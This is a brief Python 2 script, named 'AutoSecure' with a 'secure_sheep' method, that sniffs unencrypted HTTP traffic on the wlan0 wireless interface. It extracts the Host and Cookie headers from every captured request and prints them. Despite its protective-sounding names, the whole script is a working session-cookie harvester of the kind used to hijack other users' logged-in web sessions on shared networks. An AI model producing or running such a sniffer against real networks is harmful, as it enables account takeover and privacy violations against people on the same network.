import getopt, sys, pcap, dpkt, re, httplib, urllib

def re_extract(rex, data):
    m = re.search(rex, data)
    if m:
        return m.group(0)

class AutoSecure:
    def __init__(self, device="wlan0"):
        self.device = device

    def get_packets(self):
        cap = pcap.pcap(self.device)
        cap.setfilter('dst port 80')
        for ts, raw in cap:
            eth = dpkt.ethernet.Ethernet(raw)
            if isinstance(eth.data, str):
                data = eth.data
            else:
                data = eth.data.data.data
            yield ts, data

    def get_sessions(self):
        for ts, data in self.get_packets():
            session = self.extract_session(data)
            if session:
                yield session

    def extract_session(self, packet):
        host = re_extract('Host: ([^\r\n]+)', packet)
        if not host:
            return
        cookie = re_extract('Cookie: ([^\r\n]+)', packet)
        if not cookie:
            return
        return {
            'host': host,
            'cookie': cookie,
        }

    def secure_sheep(self):
        for x in self.get_sessions():
            print x

if __name__ == "__main__":
    a = AutoSecure()
    a.secure_sheep()
